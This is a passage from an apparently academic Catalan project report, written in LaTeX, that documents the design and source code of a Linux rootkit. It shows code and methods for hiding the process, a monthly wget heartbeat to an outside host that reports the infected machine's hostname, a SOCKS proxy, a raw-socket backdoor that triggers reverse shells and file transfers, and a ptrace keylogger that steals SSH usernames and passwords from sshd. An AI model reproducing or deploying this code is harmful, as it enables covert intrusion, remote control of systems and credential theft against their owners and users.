            memset(argv@PYZlb[]i@PYZrb[], @PYag[0], strlen(argv@PYZlb[]i@PYZrb[]));
            realloc(argv@PYZlb[]i@PYZrb[], strlen(PROCNAME)@PYbe[+]@PYag[1]);
            memcpy(argv@PYZlb[]i@PYZrb[], PROCNAME, strlen(PROCNAME)@PYbe[+]@PYag[1]);
        }
}
\end{Verbatim}
    \caption{launcher.c::rename\_proc()}
    \label{fig:laucner_rename_proc}
\end{figure}

\item Executable no referenciat des de /proc/self/exe, i chdir a / . \\
Per tal que de si algú sospita del procés no es trobin pistes de què realment no és un procés intern del sistema operatiu, just al arrancar el procés,
aquest canvia de directori al directori arrel. Un cop llançat el procés, aquest es mapeja en una altre posició de memòria, i elimina les antigues pàgines. D'aquesta manera, aconsegueix eliminar la referència de /proc/self/exe, i que llavors aquest no apunti a l'executable en qüestió. 

\item Localització física del fitxer. \\
Per tal que el fitxer estigui força amagat, s'ha  buscat un path al sistema on rarament s'hi accedeixi. El
path escollit per defecte és /usr/share/zoneinfo/posix/America/Indiana/. / i és possible canviar-lo en 
les opcions de compilació.
\item Comunicació xifrada. \\
Un altre mètode d'ocultació és el fet de xifrar tot el trànsit que passa per la xarxa, de tal manera que ningú pogués veure de forma accidental o 
intencionada, que és el què està viatjant per la xarxa.
\item Eliminació de les variables d'entorn. \\
Al ser executat, el launcher elimina tota variable d'entorn per tal que no es pugui tenir cap pista de què és el procés.
\end{enumerate} 

 
\subsection{Heard beat}
Per implementar el heard beat, s'han utilitzat les tasques programades de periodicitat mensual. En l'script
.monthly, s'ha afegit la comanda de la figura XXX

\begin{Verbatim}[commandchars=@\[\]]
wget -q hostru.mine.nu/index.php?h@PYbe[=]@PYay[$(]hostname@PYay[)]
\end{Verbatim}

Aquesta comanda, s'executarà mensualment, i realitzarà una petició contra una pàgina web, allotjada en un
servidor gratuït. Al realitzar la petició, aquesta quedarà contabilitzada juntament amb el hostname i la ip
on es troba el rootkit.

\subsection{Independència de la shell}
Per a aconseguir que el rootkit no depengui de quina shell té instal·lada el sistema on s'està executant, 
s'ha modificat la shell dash\footnote{shell basada en ash, reescrita per debian. Té la peculiaritat de ser
una shell a l'estil sh, però d'un tamany molt reduit} per a poder-se afegir dintre el rootkit. \\

En el moment en què es compila el rootkit, aquest ens demana si volem incloure una shell dintre seu, i en
cas de voler, incorpora el codi basat en dash. Com sempre aquest codi també es estàtic i compilat utilitzant
la llibreria dietlibc. \\

Els canvis que han estat necessaris per tal d'incloure la shell dash en el rootkit, són uns canvis força
metòdics i que no aporten gaire valor afegit. En cas d'interessar, es pot consultar directament al codi.\\

\subsection{Proxy socks}
Per a afegir aquesta funcionalitat al nostre rootkit, s'ha intentat (igual que en el cas anterior), buscar
un software existent que ens oferis la funcionalitat desitjada. El problema que hem tingut en el cas del servei de
socks, és que els paquets disponibles, ofereixen moltíssimes altres funcionalitats que nosaltres no
necessitem. Aquest mateix fet, feia molt costós el modificar el codi per a tenir un servei socks simple, i 
per aquest motiu s'ha decidit implementar des de zero tot el protocol. Cal tenir en compte però,
que el protocol socks, és un protocol força senzill. \\

El primer a fer, ha estat buscar les especificacions formals del protocol\footnote{Les especificacions 
formals}. Un cop localitzades, i estudiades, s'ha decidit implementar la versió 4 i la versió 4a ja 
que ofereixen exactament el què necessitem. \\

Com veurem a continuació, la diferència entre la versió 4 i 4a, rau en què la versió 4, el servei de socks
espera rebre una direcció on connectar-se, i en la 4a rep un domini que el propi servei de socks ha de
resoldre. Ambdues versions del protocol, en un primer moment el client envia una capçalera, i un cop enviada,
si el servei de socks és capaç de establir-hi una connexió, la connexió que ha inicilitzat el client, es
transforma en la connexió que ha solicitat sent el servidor socks, un intermediari.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaJ[void] @PYaL[pthread_socks](@PYaJ[void] @PYbe[*]sock) {
    @PYay[struct] message req;
    @PYay[struct] in_addr in;

    @PYaE[// read client packet]
    read((@PYaJ[int])sock, @PYbe[&]req, @PYay[sizeof](@PYay[struct] message));
    @PYaJ[char] buf@PYZlb[]@PYag[4]@PYZrb[];
    read((@PYaJ[int])sock, buf, @PYag[4]);
    print_message(@PYbe[&]req);

    @PYaE[// if client is using socks4a]
    in.s_addr @PYbe[=] req.dstip;
    @PYay[if] (strstr(inet_ntoa(in), @PYaB["]@PYaB[0.0.0]@PYaB["])) {
		@PYaJ[char] dstip4a@PYZlb[]@PYag[1024]@PYZrb[];
		read((@PYaJ[int])sock, dstip4a, @PYag[1024]);
		req.dstip @PYbe[=] resolve(dstip4a, @PYag[0]);
	}

    @PYaE[// socks]
    @PYaJ[int] sock2;
    @PYay[if] ((sock2 @PYbe[=] launcher_rcon(req.dstip, ntohs(req.dstport))) @PYbe[>] @PYag[0]) {
        debug(@PYaB["]@PYaB[Connected!]@PYao[\n]@PYaB["]);
        req.cd @PYbe[=] @PYag[90];
        write((@PYaJ[int])sock, @PYbe[&]req, @PYay[sizeof](req));
        socks_forward((@PYaJ[int])sock, sock2);
    } @PYay[else] {
        debug(@PYaB["]@PYaB[ERROR!]@PYao[\n]@PYaB["]);
        req.cd @PYbe[=] @PYag[91];
        write((@PYaJ[int])sock, @PYbe[&]req, @PYay[sizeof](req));
    }
    close((@PYaJ[int])sock);
    close(sock2);
    exit(@PYag[0]);
}
\end{Verbatim}
    \caption{socksd.c::pthread\_socks()}
    \label{fig:socksd}
\end{figure}

En la figura \ref{fig:socksd} es mostra la funció més caracteristica d'aquesta funcionalitat, ja que és 
la funció que interpreta les capçaleres socks4 i socks4a. En ella, podem veure com omplim l'estructura
message amb la capçalera que ens envia el client. Just després, es comproba si la destinació és una 
destinació vàlida o no, i en cas de no ser-ho, es llegeix més enllà de la capçalera on si espera trobar 
el nom DNS del host on establir la connexió. \\
Com podem veure, just abans de passar a reenviar incondicionalment tot el tràfic entre els dos cantons
de la conneixó, cal que enviem al client, un missatge comunicant-li si la connexió s'ha pogut establir
o no.

\section{Entorn privilegiat}
En l'entorn privilegiat, el nostre rootkit s'aprofita de la possibilitat de poder utilitzar raw sockets 
per tal d'implementar modes de comunicació pensats per comunicar-se amb sistemes molt protegits i xarxes 
molt restrictives, i de la possibilitat de debugar serveis del sistema. \\

Una descripció més conceptual del funcionament d'aquest protocol de comunicació, ha estat comentada en 
detall i amb l'ajuda d'esquemes en l'apartat de disseny del rootkit (POSAR REFERÈNCIA). Per al major 
aprofitament d'aquest punt, se'n recomana la lectura. \\

\subsection{Modes de comunicació}
Tal i com es pot veure en la figura \ref{fig:launcher_raw_daemon} , el rootkit en execució en un entorn 
privilegiat, es troba executant un while on cada paquet de xarxa que arriba a la màquina (independentment
de si el port de destí està obert o no), la funció recvfrom el rep. Com que la majoria de paquets que
rebrà una màquina, no seran paquets nostres, ens interessa que aquesta funció tingui la menor latencia 
possible per afectar el mínim possible a la màquina on corri el nostre rootkit. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
sock @PYbe[=] socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
@PYay[if] (sock @PYbe[<] @PYag[0]) {
    debug(@PYaB["]@PYaB[Can't allocate raw socket]@PYao[\n]@PYaB["]);
    exit(@PYbe[-]@PYag[1]);
}

antidebug_obfuscate_analysis(@PYag[16]);

@PYay[while] (@PYag[1]) {
    size @PYbe[=] recvfrom(sock, @PYbe[&]p, @PYay[sizeof](p), @PYag[0], (@PYay[struct] sockaddr @PYbe[*]) @PYbe[&]raw, @PYbe[&]slen);
    @PYaE[// Si el tamany del paquet es el que toca]
    @PYay[if] (size @PYbe[=]@PYbe[=] @PYay[sizeof](@PYay[struct] packet)) {
        @PYaE[// I el password és correcte]
        @PYay[if] (@PYbe[!]memcmp(CLIENTAUTH, p.action.pass, @PYag[20])) {
            debug(@PYaB["]@PYaB[S'ha rebut el paquet d'autenticat (action: %d)]@PYao[\n]@PYaB["], p.action.action);
            do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
        } @PYay[else] @PYay[if] (@PYbe[!]memcmp(CHECKSTR, p.action.pass, @PYag[20]) @PYbe[&]@PYbe[&] (p.action.action @PYbe[=]@PYbe[=] CHECK @PYbe[|]@PYbe[|] p.action.action @PYbe[=]@PYbe[=] REVCHECK)) {
            debug(@PYaB["]@PYaB[S'ha rebut el paquet de CHECK]@PYao[\n]@PYaB["]);
            do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
		}
    }
}
\end{Verbatim}
    \caption{launcher.c::raw\_daemon()}
    \label{fig:launcher_raw_daemon}
\end{figure}

La primera comprobació que es fa, és la del tamany de paquet. Si el tamany de paquet rebut no és exactament
la dels nostres paquets, aquest paquet ja pot ser descartat. Gràcies a això, podem descartar la majoria de 
paquets que no van destinats al rootkit. En cas que un paquet ocupi exactament com els nostres paquets, 
caldrà comprobar si es tracta d'un paquet autenticat amb la contrasenya escollida en el moment de la 
compilació (CLIENTAUTH) o si es tracta d'una comprobació per veure si el rootkit està instal·lat o no 
(independentment de coneixer la contrasenya o no). \\

Un cop ens arribi un paquet autenticat, d'aquest se li extreu el típus d'acció a executar.

\subsubsection{Mode de comunicació REV}
En cas que en el paquet rebut es soliciti realitzar una acció de tipus reversa, el primer que caldrà fer
és establir una connexió amb l'origen del paquet. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYay[case] REVUPLOAD:
	@PYay[if] (fork()) @PYay[return];
    debug(@PYaB["]@PYaB[Reverse uploading file]@PYao[\n]@PYaB["]);
    @PYay[if] ((sock @PYbe[=] launcher_rcon(ip@PYbe[-]@PYbe[>]s_addr, d@PYbe[-]@PYbe[>]port))) {
        launcher_upload(sock, sock, (@PYaJ[char] @PYbe[*])d@PYbe[-]@PYbe[>]bytes, d@PYbe[-]@PYbe[>]size);
        close(sock);
    }
    @PYay[break];
@PYay[case] REVDOWNLOAD:
	@PYay[if] (fork()) @PYay[return];
    debug(@PYaB["]@PYaB[Reverse downloading file]@PYao[\n]@PYaB["]);
    @PYay[if] ((sock @PYbe[=] launcher_rcon(ip@PYbe[-]@PYbe[>]s_addr, d@PYbe[-]@PYbe[>]port))) {
        launcher_download(sock, sock, (@PYaJ[char] @PYbe[*])d@PYbe[-]@PYbe[>]bytes, d@PYbe[-]@PYbe[>]size);
        close(sock);
    }
    @PYay[break];
@PYay[case] REVSHELL:
	@PYay[if] (fork()) @PYay[return];
    debug(@PYaB["]@PYaB[Launching reverse shell]@PYao[\n]@PYaB["]);
    @PYay[if] ((sock @PYbe[=] launcher_rcon(ip@PYbe[-]@PYbe[>]s_addr, d@PYbe[-]@PYbe[>]port))) {
        launcher_shell(sock, sock);
        close(sock);
    }
    @PYay[break];
\end{Verbatim}
    \caption{launcher.c::do\_action()}
    \label{fig:launcer_do_rev_action}
\end{figure}

Podem veure en la figura \ref{fig:launcer_do_rev_action} que aquesta conneixó serà establerta utilitzant
la funció launcher\_rcon() que un cop estableixi la connexió amb l'origen del paquet (ip->s\_addr i d->port)
retorna un socket que és el què serà utilitzat.


\subsubsection{Mode de comunicació RAW}
 
\subsection{Keylogger}
La idea que hi havia a l'hora d'implementar el keylogger, era que aquest no s'implementés com a mòdul o
utilitzant la injecció de codi en el kernel, ja que aquesta tècnica depen molt de la versió de kernel que 
s'estigui utilitzant en un moment donat. Com que per aquest funcionalitat disposem de accés de root, podem
fer gairebé qualsevol cosa a nivell d'usuari, i per aquest motiu, pensavem que seria possible. \\

Cal dir que l'objectiu principal per aquesta funcionalitat, es el de permetre'ns recuperar el password de l'usuari
root o almenys la d'algun usuari del sistema. Per aquest motiu, el servei que s'ha posat com a objectiu, ha estat el OpenSSH\footnote{Openssh .....}
Aquest servei s'acostuma a trobar instal·lat a la majoria de màquines UNIX i permet a usuaris de sistema
autenticar-se per a usar i administrar la màquina. Cal tenir en compte que aquest servei és considerat seguir
ja que utilitzar algoritmes criptogràfics així com claus públiques i privades.\\

La primera opció que es va seguir per tal de poder llegir els passwords del sistema, va ser intentar 
interceptar totes les escriptures a els dispositius tipus tty o pts. Aquests dispositius són els què reben 
les dades ja en clar i comuniquen el servei de Openssh amb la shell del sistema. \\
La idea era comprobar quins dispositius estava utilitzant l'ssh i començar a llegir d'ells, el problema que
varem tenir, és que si el nostre keylogger llegia del dispositiu, llavors l'aplicació en qüestió no revia les
dades, sinó que l'únic que les revia era el keylogger. El primer que es va intentar per arreglar això,
va ser intentar un cop llegides les dades, ser capaços de escriure-les a algun altre lloc per a què
l'aplicació les acabés rebent, el què passa és que el funcionament dels termianls tty y pts, estan pensants
justament per evitar això.\\

En definitiva això permetria recuperar el password, però alhora deixa inhabilitat el servei denegant així 
totes les possibles noves connexions. \\

La segona opció que teníem ja va resultar. Aquesta tractava de que el nostre keylogger debuggués l'aplicació
en qüestió podent així interceptar cada crida al sistema, i poder seguir l'execució del servei fins al moment
en què el servei intenta autenticar-se al sistema utilitzant les dades que el client de ssh li ha passat. \\

El funcionament del keylogger queda doncs resumit en aquests passos:
\begin{enumerate}
\item Busqueda del servei de Openssh.
\item Inici del debug interceptant totes les crides a sistema.
\item Traça de les crides clone i read.
\item Detecció de l'enviament d'un nom d'usuari i password.
\item Emmagatzemament de les dades capturades en un fitxer xifrat.
\end{enumerate}

El primer punt és la localització del procés sshd. Per trobar-lo s'ha utilitzat la búsqueda a través del
directori /proc. Es busca un procés que pengi del procés init, i que tingui el nom de sshd. \\

Un cop trobat aquest procés, el primer que fa el keylogger, és canviar-se el nom de procés a el nom 
exacte que té el procés que vol debugar. Un cop fet això, cal attachar-s'hi utilitzant la crida de sistemes 
POSIX ptrace. A partir d'aquest moment, es pot dir que estem debugant el servei. \\

Un cop attachat el keylogger espera que el servei Openssh executi les crides a sistema clone() i read().
La crida clone() és utilitzada per a crear nous processos per atendre les noves connexions en les què
hi haurà un usuari intentant-se autenticar. La crida read() és utilitzada per a llegir l'usuari i password
que l'usuari entra i amb els què es vol autenticar. \\

En el moment que el keylogger detecta que arriba una nova connexió, aquest s'attacha a el nou procés creat
per a l'Openssh, i el segueix fins a rebre les dades d'autenticació (usuari i password). Un cop els té,
deixa de debugar el procés i li permet la seva normal execució. \\

Les dades capturades són emmagatzemades en un fitxer relatiu al home del rootkit anomenat ``.k\_sshd''. 
El contingut d'aquest fitxer està xifrat amb el mateix password que s'utilitza per xifrar el contingut
dels paquets de xarxa així com per autenticar el client amb el launcher. Per tal de poder accedir de
manera fàcil al contingut en clar d'aquest fitxer, el propi launcher permet ser llançat per tal de desxifrar
el fitxer ``.k\_sshd''.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaJ[int] check_ssh_password(@PYaJ[unsigned] @PYaJ[char] @PYbe[*]buff, @PYaJ[int] len){
	@PYaE[// Password string is | uint | chars |]
	@PYay[if] (len @PYbe[>] @PYag[32] @PYbe[|]@PYbe[|] len @PYbe[<] @PYag[5]) @PYay[return] @PYag[0];

    @PYaE[// ptr points to the last char of the string]
	@PYaJ[unsigned] @PYaJ[char] @PYbe[*]ptr @PYbe[=] buff@PYbe[+]len@PYbe[-]@PYag[1];
	@PYay[while] (@PYbe[*]ptr @PYbe[!]@PYbe[=] @PYaT[0x00]) ptr@PYbe[-]@PYbe[-];

	antidebug_obfuscate_analysis(@PYag[11]);
	@PYaE[// Now we must have two bytes 0x00 at left and one < 0x0f at right]
	@PYay[if] ( @PYbe[*](ptr@PYbe[-]@PYag[1]) @PYbe[!]@PYbe[=] @PYaT[0x00] @PYbe[|]@PYbe[|] @PYbe[*](ptr@PYbe[-]@PYag[2]) @PYbe[!]@PYbe[=] @PYaT[0x00]) @PYay[return] @PYag[0];

	@PYaE[// Now bytes from ptr+2 to buff+len-1 has to be exactly *ptr+1]
	@PYay[if] (((buff@PYbe[+]len@PYbe[-]@PYag[1])@PYbe[-](ptr@PYbe[+]@PYag[1])) @PYbe[!]@PYbe[=] @PYbe[*](ptr@PYbe[+]@PYag[1])) @PYay[return] @PYag[0];

    @PYay[if] (useRc4) {
        rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])RC4KEY, @PYay[sizeof](RC4KEY), @PYbe[&]rc4_crypt);
        rc4(ptr@PYbe[+]@PYag[2], @PYbe[*](ptr@PYbe[+]@PYag[1]), @PYbe[&]rc4_crypt);
    }
    write(@PYag[1], ptr@PYbe[+]@PYag[2], @PYbe[*](ptr@PYbe[+]@PYag[1]));
    putchar(@PYac['\n']);

    @PYay[return] @PYag[1];
}
\end{Verbatim}
    \caption{keylogger.c::check\_ssh\_password()}
    \label{fig:keylogger_check_password}
\end{figure}
      
En la figura \ref{fig:keylogger} es mostra el tros de codi que comproba que l'string llegit és un string 
de usuari o de password i en cas de ser-ho ho xifra i ho escriu al fitxer en qüestió ja que previament 
s'hi ha mapejat el descriptor de fitxer 1. Aquesta funció és cridada quan s'intercepta un string llegit per
un read() per a comprobar que segueix el format que utilitza l'Openssh. \\

Com és evident, per tal de poder desenvolupar el keylogger per l'Openssh, va caldre un gran estudi del 
comportament d'aquest software per ser capaços de detectar com i quan es transfereixen les dades d'usuari i
password. \\
En aquest anàlisis, ens varem donar compte que les dades en clar utilitzades durant l'autenticació, eren
transferides utilitzant un format en concret que és el què aquesta funció comproba. El format en qüestió
és TAG + LONGITUD + DADES on les dades és un string. Tenint en compte que un password serà normalment més
curt que 255 caràcters, i que la longitud està expressada en 4 bytes, aquesta funció comproba que el format
es compleix. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
ptrace(PTRACE_SYSCALL, pid, @PYaX[NULL], @PYaX[NULL]);
exitPid @PYbe[=] wait(@PYbe[&]status);

antidebug_obfuscate_analysis(@PYag[3]);
@PYay[if] (WIFSTOPPED(status)) {
    @PYay[if] (WSTOPSIG(status) @PYbe[=]@PYbe[=] SIGCHLD) {
        ptrace(PTRACE_CONT, pid, @PYag[0], SIGCHLD);
        kill(pid, SIGSTOP);
    } @PYay[else] 
        @PYay[if] (WSTOPSIG(status) @PYbe[!]@PYbe[=] SIGTRAP @PYbe[&]@PYbe[&]  WSTOPSIG(status) @PYbe[!]@PYbe[=] SIGSTOP) {
        ptrace(PTRACE_CONT, pid, @PYag[0], WSTOPSIG(status));
        debug(@PYaB["]@PYaB[Acabant procés pare %d (%d)]@PYao[\n]@PYaB["], pid, WSTOPSIG(status));
        @PYay[break];
    }
    @PYay[else] {
        orig_eax @PYbe[=] ptrace(PTRACE_PEEKUSER, pid, @PYag[4] @PYbe[*] ORIG_EAX, @PYaX[NULL]);

        antidebug_obfuscate_analysis(@PYag[4]);
        @PYay[switch] (orig_eax) {
            @PYay[case] __NR_clone:
                @PYay[if](insyscall @PYbe[=]@PYbe[=] @PYag[0]) {
                    debug(@PYaB["]@PYaB[fork]@PYao[\n]@PYaB["]);
                    insyscall @PYbe[=] @PYag[1];
                } @PYay[else] {
                    insyscall @PYbe[=] @PYag[0];
                    eax @PYbe[=] ptrace(PTRACE_PEEKUSER, pid, @PYag[4] @PYbe[*] EAX, @PYaX[NULL]);
                    @PYay[if](@PYbe[!]fork()) {
                        lookForReads(eax);
                    }
\end{Verbatim}
    \caption{keylogger.c::main()}
    \label{fig:keylogger_main}
\end{figure}

En la figura \ref{fig:keylogger_main} podem veure com un cop ja estem attachats al procés principal del 
Openssh, anem seguin les diferents crides a sistema per trobar en aquest cas un clone(). En el moment
en que es retorni de la crida clone(), capturem el valor del registre eax que correspon al pid del procés
fill o 0 en cas de ser el propi fill. Quan en el pare obtenim el pid del fill acabat de crear, saltem a la 
funció lookForReads() tot passant-li el nou pid a seguir. En aquest funció, es crearà un nou procés del 
nostre keylogger, que segurà exclusivament aquest nou procés que acaba de crear l'Openssh. En aquesta nova
connexió, ja serà on buscarem les dades que ens interessen. \\

Podem veure en la mateixa figura, que segons el signal que faci aturar el nostre procés, ens interessarà
que aquest arrivi al procés que estem debugant, o fins i tot, farà que deixem de debugar-lo ja que entendrem
que es vol aturar el servei. \\

Per acabar, comentar que aquest keylogger s'ha implementat només per i386 i funciona per tota la branca 
de l'Openssh de la versió 2.x. Tot i això, el fet de passar-la a x86\_64, és trivial i es farà fora de 
l'àmbit del projecte. També comentar que la intenció és acabar-hi afegint nous serveis per a que el keylogger
sigui capaç de capturar informació d'altres fonts.

\subsection{Injecció de codi en memòria del nucli}
En el transcurs del projecte, l'equip que desenvolupa el kernel de Linux, varen aplicar un 
patch\footnote{\href{Patch que evita l'ús de /dev/mem per accedir a la memòria}{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=ae531c26c5c2a28ca1b35a75b39b3b256850f2c8}} que evita
l'accés a la memòria a través de /dev/mem quedant així totalment impossibilitada la tècnica que es volia 
utilitzar. 

